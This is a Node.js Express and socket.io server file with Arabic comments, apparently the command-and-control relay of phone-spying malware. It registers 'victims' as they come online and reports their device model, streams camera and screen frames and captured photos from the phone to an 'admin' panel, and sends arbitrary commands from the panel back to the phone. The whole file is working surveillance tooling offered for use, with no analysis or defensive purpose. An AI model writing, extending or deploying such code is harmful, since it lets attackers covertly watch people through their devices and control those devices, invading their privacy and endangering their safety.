const express = require('express');
const path = require('path');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // لضمان استقبال الصور بجودة عالية
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

io.on('connection', (socket) => {
    console.log('[!] Connection established');

    socket.on('victim_online', (data) => {
        socket.broadcast.emit('new_victim_alert', { id: socket.id, model: data.model });
    });

    // تمرير البث (كاميرا، شاشة) من الهاتف للوحة
    socket.on('video_frame', (frame) => {
        socket.broadcast.emit('display_frame', { frame: frame });
    });

    // تمرير الصور الملتقطة
    socket.on('photo_captured', (img) => {
        socket.broadcast.emit('display_photo', { img: img });
    });

    // تمرير الأوامر من اللوحة للهاتف
    socket.on('admin_command', (data) => {
        socket.broadcast.emit(data.command, data);
    });
});

const PORT = process.env.PORT || 8080;
http.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
